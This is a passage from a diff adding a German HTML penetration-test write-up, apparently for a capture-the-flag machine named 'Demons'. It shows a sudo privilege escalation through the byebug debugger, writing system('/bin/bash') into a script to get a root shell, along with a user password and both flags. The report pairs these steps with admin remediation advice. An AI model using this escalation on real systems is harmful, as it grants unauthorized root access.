+                <strong>Empfehlung (Admin):</strong> Entfernen Sie die unsichere `sudo`-Regel für `byebug`. Erlauben Sie niemals Debugger oder Interpreter (wie python, perl, ruby, etc.) mit `sudo` auszuführen, wenn dies nicht absolut notwendig und stark eingeschränkt ist, da diese fast immer Shell-Escapes ermöglichen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Befehle als agares -->
+                    <div class="prompt" style="color: #ffffff;">agares@Demons:/tmp$ <span class="command">sudo -l</span></div>
+                    <pre>
+[sudo] password for agares: <span class="password">d3monf4m</span> # Passwort eingegeben
+Matching Defaults entries for agares on Demons:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User agares may run the following commands on Demons:
+    (ALL : ALL) /bin/byebug
+                    </pre>
+                     <div class="prompt" style="color: #ffffff;">agares@Demons:/tmp$ <span class="command">echo "system('/bin/bash')" > script.rb</span></div>
+                     <div class="prompt" style="color: #ffffff;">agares@Demons:/tmp$ <span class="command">sudo /bin/byebug script.rb</span></div>
+                    <pre>
+
+[1, 1] in /tmp/script.rb
+=> 1: system('/bin/bash')
+                    </pre>
+                    <!-- Innerhalb von byebug -->
+                     <div class="prompt" style="color: #ffffff;">(byebug) <span class="command">continue</span></div>
+                     <!-- Root-Shell wird gestartet -->
+                 </div>
+            </div>
+        </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept (Root Shell)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach der erfolgreichen Ausführung von `sudo /bin/byebug script.rb` und dem `continue`-Befehl wird eine Root-Shell erlangt. Der Benutzer wechselt zu `root`, was durch den Prompt `root@Demons:/tmp#` angezeigt wird. Das Root-Verzeichnis wird betreten und die `root.txt`-Datei wird ausgelesen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Proof of Concept für die Erlangung von Root-Rechten ist erfolgreich erbracht. Die Root-Flag (`inTheDark_BeAlone_OrLAst!`) wurde gefunden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Kompromittierung ist vollständig. Dokumentieren Sie die Schritte und Flags.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beheben Sie die `sudo`-Fehlkonfiguration als höchste Priorität. Überprüfen Sie das gesamte System auf ähnliche Schwachstellen und Fehlkonfigurationen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Root-Shell, erlangt durch byebug -->
+                    <div class="prompt" style="color: #ff0000;">root@Demons:/tmp# <span class="command">id</span></div>
+                    <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                    <div class="prompt" style="color: #ff0000;">root@Demons:/tmp# <span class="command">cd /root</span></div>
+                    <div class="prompt" style="color: #ff0000;">root@Demons:~# <span class="command">ls</span></div>
+                    <pre>root.txt</pre>
+                    <div class="prompt" style="color: #ff0000;">root@Demons:~# <span class="command">cat root.txt</span></div>
+                    <pre><span class="password">inTheDark_BeAlone_OrLAst!</span></pre>
+                    <div class="prompt" style="color: #ff0000;">root@Demons:~# <span class="command"></span></div><!-- Root Prompt -->
+                </div>
+            </div>
+        </section>
+
+       <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">DemonsDontCry</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">inTheDark_BeAlone_OrLAst!</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 1. November 2022</p> <!-- Datum aus wget/hydra Kontext -->
+    </footer>
+</body>
+</html>
